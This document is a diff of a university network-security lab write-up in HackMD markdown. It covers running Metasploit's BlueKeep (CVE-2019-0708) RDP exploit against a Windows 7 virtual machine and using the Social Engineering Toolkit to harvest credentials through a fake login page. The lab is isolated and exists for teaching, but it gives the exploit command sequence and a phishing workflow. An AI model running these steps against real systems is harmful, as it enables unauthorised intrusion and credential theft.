@@ -11,39 +11,33 @@ date: 2023-05-27
 ###### tags: `Practicum of A&D of NS` `NTU`
 
 ## Metasploit with Bluekeep Vulnerability (CVE-2019-0708)
-
 ### Setting up environment
 * Open Windows 7 and Kali-Linux with `localhost only` mode
-    :::spoiler Screenshot
     ![](https://hackmd.io/_uploads/Skg3sJ93Hh.png)
     
     ![](https://hackmd.io/_uploads/ByyTJqnHh.png)
-    :::
+
 * Then we can note that the IP of these two machines are different:
-    :::spoiler Screenshot
     ![](https://hackmd.io/_uploads/H1gOg5hSn.png)
     
     ![](https://hackmd.io/_uploads/H1VSlcnB3.png)
-    :::
+    
     Now, we know `Win7`'s IP: `192.168.56.101`
     Kali-Linux's IP: `192.168.56.102`
 
 * Test the connection of these machines
-    :::spoiler Screenshot
     ![](https://hackmd.io/_uploads/HJ3D-5hS2.png)
 
     ![](https://hackmd.io/_uploads/S1eSW5hB3.png)
-    :::
+
 * Always allow the remote desktop connection of `Win7`
-    :::spoiler Screenshot
     ![](https://hackmd.io/_uploads/Hk0yzchB3.png)
     
     ![](https://hackmd.io/_uploads/HJQxfc3Sh.png)
-    :::
 
 ### Try to Exploit
 * Open Metasploit in Kali-Linux
-    ```bash!
+    ```bash
     $ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
     $ info # Can check the mode you'd like to use
     $ set rhost 192.168.56.101 # set remote host IP -> victim(Win7)
@@ -53,22 +47,17 @@ date: 2023-05-27
     $ check # Check if the victim can be exploited or not
     $ exploit # Actually attack
     ```
-    :::info
-    Sometimes the attack will not always success, you must try until it success.
-    :::
     
-    :::spoiler Detailed Screenshot
+    Sometimes the attack will not always success, you must try until it success.
     ![](https://hackmd.io/_uploads/H1PUwq2S3.png)
     ![](https://hackmd.io/_uploads/ByQ6wqnHh.png)
-    :::
 
 ### Remote Desktop
-
 ## Social Engineering in Kali-Linux
 1. Set up the network environment same as the lab above
 2. Open Social Engineering Toolkit(root) in Kali-Linux
 3. Enter Command
-    ```bash!
+    ```bash
     ...
        1) Spear-Phishing Attack Vectors
        2) Website Attack Vectors
@@ -127,11 +116,9 @@ date: 2023-05-27
 
     ```
 4. Open Chrome in Win7 and enter Kali IP and enter your account/password
-    :::spoiler Screenshot
     ![](https://hackmd.io/_uploads/SJBgpB1In.png)
-    :::
 5. Check Kali-Linux Terminal
-    ```bash!
+    ```bash
     192.168.56.101 - - [27/May/2023 05:25:50] "GET / HTTP/1.1" 200 -
     192.168.56.101 - - [27/May/2023 05:26:48] "GET /favicon.ico HTTP/1.1" 404 -
     [*] WE GOT A HIT! Printing the output:
@@ -152,4 +139,5 @@ date: 2023-05-27
     [*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
     ```
 6. Done
-We try to fetch the victim's account using fake web template...
+    
+    We try to fetch the victim's account using fake web template...
